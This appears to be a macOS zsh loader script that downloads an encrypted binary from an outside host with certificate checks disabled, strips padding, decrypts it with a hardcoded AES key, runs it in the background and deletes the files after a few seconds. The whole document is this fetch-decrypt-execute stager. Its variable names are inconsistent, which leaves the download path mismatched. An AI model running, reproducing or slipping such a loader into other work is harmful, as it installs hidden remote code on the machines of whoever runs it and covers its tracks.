#!/bin/zsh
vdvez=$(mktemp /tmp/nk6cja.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m291a7302fd39bcdb.bin" -o "$vdvezz" || exit 1
eyeqjm=$(stat -f %z "$vdvezz"); w85n3cp=$(( eyeqjm - 688 - 3617 ))
tail -c +$(( 688 + 1 )) "$vdvezz" | head -c $w85n3cp | openssl enc -d -aes-256-cbc -k dea9ecfe2700870968f42514 -out "$vdvez" 2>/dev/null
[ -s "$vdvez" ] && chmod 700 "$vdvez" && ( "$vdvez" & ) && disown
( sleep 3; rm -f "$vdvez" "$vdvezz" ) &>/dev/null &
